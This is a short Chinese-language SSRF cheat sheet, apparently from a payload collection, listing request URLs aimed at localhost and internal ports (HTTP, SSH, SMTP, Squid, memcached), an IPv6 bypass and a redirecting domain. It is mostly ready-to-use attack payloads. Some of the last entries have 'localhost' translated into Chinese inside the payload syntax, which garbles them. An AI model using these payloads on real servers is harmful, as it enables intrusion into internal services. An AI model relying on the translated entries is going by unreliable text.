# 伪造服务器端请求
服务器端请求伪造或是SSRF是一个攻击者可以迫使服务器为他执行请求的漏洞.	

## 开发

基本SSRF v1
```
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
```

基本SSRF v2
```
http://localhost:80
http://localhost:443
http://localhost:22
```

用[::]绕过主机
```
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:22/ SSH
http://[::]:3128/ Squid
```

绕过本地主机，将域名重定向到本地主机
```
http://n-pn.info
```

-> 11211
本地主机:+11211aaa
本地主机:00011211aaaa

## 致谢
* 


